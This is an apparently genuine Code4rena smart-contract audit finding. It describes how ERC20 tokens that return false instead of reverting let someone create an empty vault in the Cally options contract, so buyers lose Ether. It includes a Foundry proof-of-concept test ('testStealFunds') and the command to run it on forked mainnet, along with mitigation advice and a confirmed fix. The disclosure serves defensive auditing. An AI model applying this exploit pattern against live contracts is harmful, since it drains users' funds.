[H-01] no-revert-on-transfer ERC20 tokens can be drained
Submitted by Ruhum, also found by oyc109 and smilingheretic
https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L198-L200
Impact
Some ERC20 tokens don’t throw but just return false when a transfer fails. This can be abused to trick thecreateVault()function to initialize the vault without providing any tokens. A good example of such a token isZRX:Etherscan code
When such a vault is initialized, another user can both buy and exercise the option without ever receiving any funds. The creator of the vault does receive the buyer’s Ether tho. So it can cause a loss of funds.
Proof of Concept
The trick is to create a vault with an ERC20 token but use ERC721 as the vault’s type. Then, instead of callingsafeTransferFrom()the function callstransferFrom()which won’t catch the token returning false.
Here’s a test that showcases the issue:
// CreateVault.t.solfunctiontestStealFunds()public{// address of 0x on mainnetaddresst=address(0xE41d2489571d322189246DaFA5ebDe1F4699F498);vm.startPrank(babe);require(ERC20(t).balanceOf(babe) ==0);uintvaultId=c.createVault(100,t,1,1,1,0,Cally.TokenType.ERC721);// check that neither the Cally contract nor the vault creator// had any 0x tokensrequire(ERC20(t).balanceOf(babe) ==0);require(ERC20(t).balanceOf(address(c)) ==0);// check whether vault was created properlyCally.Vaultmemoryv=c.vaults(vaultId);require(v.token==t);require(v.tokenIdOrAmount==100);vm.stopPrank();// So now there's a vault for 100 0x tokens although the Cally contract doesn't// have any.// If someone buys & exercises the option they won't receive any tokens.uintpremium=0.025ether;uintstrike=2ether;require(address(c).balance==0,"shouldn't have any balance at the beginning");require(payable(address(this)).balance>0,"not enough balance");uintoptionId=c.buyOption{value:premium}(vaultId);c.exercise{value:strike}(optionId);// buyer of option (`address(this)`) got zero 0x tokens// But buyer lost their Etherrequire(ERC20(t).balanceOf(address(this)) ==0);require(address(c).balance>0,"got some money");}
To run it, you need to use forge’s forking mode:forge test --fork-url <alchemy/infura URL> --match testStealFunds
Recommended Mitigation Steps
I think the easiest solution is to usesafeTransferFrom()when the token is of type ERC721. Since the transfer is at the end of the function there shouldn’t be any risk of reentrancy. If someone passes an ERC20 address with type ERC721, thesafeTransferFrom()call would simply fail since that function signature shouldn’t exist on ERC20 tokens.
outdoteth (Cally) confirmed and resolved:
the fix for this issue is here;https://github.com/outdoteth/cally/pull/4
HardlyDifficult (judge) commented:
This is a great report. I appreciate the clear test showcasing the issue well, and using a real token example.